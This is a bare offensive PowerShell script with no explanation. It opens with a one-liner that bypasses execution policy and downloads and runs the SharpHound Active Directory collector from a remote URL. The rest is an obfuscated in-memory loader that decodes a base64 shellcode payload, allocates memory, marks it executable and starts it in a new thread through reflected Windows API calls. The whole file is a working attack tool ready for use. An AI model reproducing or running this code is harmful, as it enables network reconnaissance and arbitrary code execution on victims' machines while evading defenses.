powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"

function tcWy0 {
        Param ($j12T, $q5tD)
        $uGQxE = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $uGQxE.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uGQxE.GetMethod('GetModuleHandle')).Invoke($null, @($j12T)))), $q5tD))
}

function dz {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $h3U,
                [Parameter(Position = 1)] [Type] $suU = [Void]
        )

        $tQF = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $tQF.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $h3U).SetImplementationFlags('Runtime, Managed')
        $tQF.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $suU, $h3U).SetImplementationFlags('Runtime, Managed')

        return $tQF.CreateType()
}

[Byte[]]$fKuz = [System.Convert]::FromBase64String("6ydbU1+wcPyudf1XWVNeigYwB0j/x0j/xmaBPz7jdAeAPnB16uvm/+Ho1P///wYEcPpMheD27MoEBgRHVUdUVFVONdRhTo9UZE6PVBxQTI1WJkyNdlZJN81OC7FOTEw3xKo4Z3gEKCZFx80LRQfF5OlUTI1WJkVXj0Q4TgXWYod8Hg8EC4N2BgQGj4aMBgQGTIPEcmNOBdaPThxCj0YkVk0H1OVSTvvPRY0wjkk3zU4F0Ew3xEfFzwmqRQfFPuRz9UoHSiAOQT/Vc9xeQI1EIk0H1GBFjQhOQI1EGk0H1EePAoxHXEdcWEwH1F9eR1xHXUdeTofqJEdW+eReRV9eTo8U7U37+ftbTDffVU24c29qb2pjcAZFUEyP5U/DxEhxIgH701dVTI/lVV5LNcZJN81VV0++PFJ/owYEBgT50e4cBgQGamtldilwaSh3Y2dzdmcpcmF1cChnaWkGXk6Nx03BxL0FBgRLNc9XVW4FV0++UY2ZwgYEBgT50e6wBgQGK3NhczBccl51PnFKdG9hb0hsVEFgQEVyaXFAZXFEM1xJd113NXdwMHJWcWkxM3NoNWB8aG0+UGlQXz0xNHZUQDxkRlloYUs+d2tKUzFUSnVHQDJ2dF58YDBTbDJxbUkybVIpSjdEUXReNUg/cmNGZzV+Y2dPPzRPTGRBWTxOR3FXNnV0cH5FMUBuNU1yY31+aStGMjRfZW1nMkY0cEtyNUpoYFxUN1ZNXEFIVTdCY0wyN3QGTI/FVV5HXEs1z1dOvAY2roAGBAYEVldVTcHG7VEoP/nRTo3AbgxbTo33bhleVGyGNwYET43mbgJFX028cUCagAQGBAb700k3xFVeTo33STfNSzXPV1VNwcYrAh5/+dGDxHMbTsPHjBUEBk28QPYx5gQGBAb700z5y3IG7a7uUQYEBldfbkZeT43XxeQUT8PGBBYEBk28XKJX4wQGBAb700yVV1VMj+NOjfdMj95Pw8YEJgQGTY/9T74Uko/mBgQGBPnRTofCJIPEcrZgjwFMB8eDxHPWXsdebgZdT8PE9LOmUPvTPuM=")
[Uint32]$yZRW = 0
$nUIaF = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tcWy0 kernel32.dll VirtualAlloc), (dz @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $fKuz.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($fKuz, 0, $nUIaF, $fKuz.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tcWy0 kernel32.dll VirtualProtect), (dz @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($nUIaF, [Uint32]$fKuz.Length, 0x10, [Ref]$yZRW)) -eq $true) {
        $zQf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tcWy0 kernel32.dll CreateThread), (dz @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$nUIaF,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tcWy0 kernel32.dll WaitForSingleObject), (dz @([IntPtr], [Int32]))).Invoke($zQf,0xffffffff) | Out-Null
}
